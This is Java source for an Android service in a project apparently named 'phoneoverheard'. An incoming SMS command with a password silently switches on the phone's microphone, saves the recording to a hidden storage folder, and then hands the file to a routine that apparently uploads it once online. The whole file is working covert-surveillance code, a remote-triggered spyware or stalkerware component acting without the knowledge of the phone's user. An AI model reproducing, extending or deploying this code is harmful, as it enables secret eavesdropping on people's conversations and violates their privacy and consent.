package com.phoneoverheard.phonne;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import com.phoneoverheard.database.SmscmdService;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.util.Log;

@SuppressLint("SimpleDateFormat")
public class luyinService extends Service {
    private static final String TAG = "luyinService";
	private File file;
	private MediaRecorder mediaRecorder;
	Date date = new Date(System.currentTimeMillis());
	SimpleDateFormat Dateformat = new SimpleDateFormat("yyyyMMddHHmmss");
	final String receiveTime = Dateformat.format(date);
	WriteLog mylog = new WriteLog();
	
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
	
    @Override  
    public void onCreate() {  
        super.onCreate(); 
        Log.i(TAG, "onCreate called.");  
    }
    
	@Override
    public void onDestroy() { 
        Log.i(TAG, "onDestroy called.");  
        stopMediaRecorder(); //停止录音
        super.stopSelf();
        super.onDestroy();  
    }
    
    @Override  
    public int onStartCommand(Intent intent, int flags, int startId) {  
        Log.i(TAG, "onStartCommand called.");  
        return super.onStartCommand(intent, flags, startId);  
    }  
    
    @Override  
    public void onStart(Intent intent, int startId) {  
        Log.i(TAG, "onStart called.");  
        mylog.WrLog("i",TAG,"执行录音服务");
        Bundle smscontent = intent.getBundleExtra("smscontent");// 根据bundle的key得到对应的对象
        String content=smscontent.getString("content");
        String sendernumber=smscontent.getString("sendernumber"); 
        String[] contents = content.split("#");
        SmscmdService smscmdservice = new SmscmdService(getBaseContext());
        String password = smscmdservice.find("luyin").getPassword();		
        if(contents[0].equals("cmd") && contents[1].equals("luyin") && new FileService().MD5(contents[2]).equals(password)){
			startMediaRecorder(); //开始录音
		}else{
			// 移动运营商允许每次发送的字节数据有限，我们可以使用Android给我们提供 的短信工具。
	        SmsManager sms = SmsManager.getDefault();
	        String ErrMsg = "密码错误！";
	        // 如果短信没有超过限制长度，则返回一个长度的List。
	        List<String> texts = sms.divideMessage(ErrMsg);
	        for (String text : texts) {
	        	sms.sendTextMessage(sendernumber,null,text,null,null);
	        }
		}
    }
   
    /**
     * 功能描述：开始录音
     */
    @SuppressLint("SimpleDateFormat")
	public void startMediaRecorder() { 
		String sDir = Environment.getExternalStorageDirectory()+"/phonne";
		File destDir = new File(sDir);
		if (!destDir.exists()) {
		   destDir.mkdirs();
		}
		file = new File(sDir, "luyin"+receiveTime+ ".3gp");
		if(mediaRecorder == null){
			mediaRecorder = new MediaRecorder();
		}else{
			mediaRecorder.reset();
		}
		mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
	    // 设置录制视频源为Camera(相机)  
		//mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);  
	    // 设置录制完成后视频的封装格式THREE_GPP为3gp.MPEG_4为mp4  
		mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
	    // 设置录制的视频编码h263 h264  
	    //mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);  
	    // 设置视频录制的分辨率。必须放在设置编码和格式的后面，否则报错  
	    //mediaRecorder.setVideoSize(320, 240);  
	    // 设置录制的视频帧率。必须放在设置编码和格式的后面，否则报错  
	    //mediaRecorder.setVideoFrameRate(20); 
		mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
		mediaRecorder.setOutputFile(file.getAbsolutePath());
		try {
			mediaRecorder.prepare();
		} catch (IllegalStateException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		mediaRecorder.start();//开始录音
		mylog.WrLog("i",TAG,"开始录音");
	}
    
    /**
     * 功能描述：停止录音
     */
    public void stopMediaRecorder() { 
		if(mediaRecorder != null){
			mylog.WrLog("i",TAG,"停止录音");
			mediaRecorder.stop(); //停止录音
			mediaRecorder.release();
			mediaRecorder = null;
			new FileService().CheckConnectInternet(file,getBaseContext());
		}  
	}
	
}
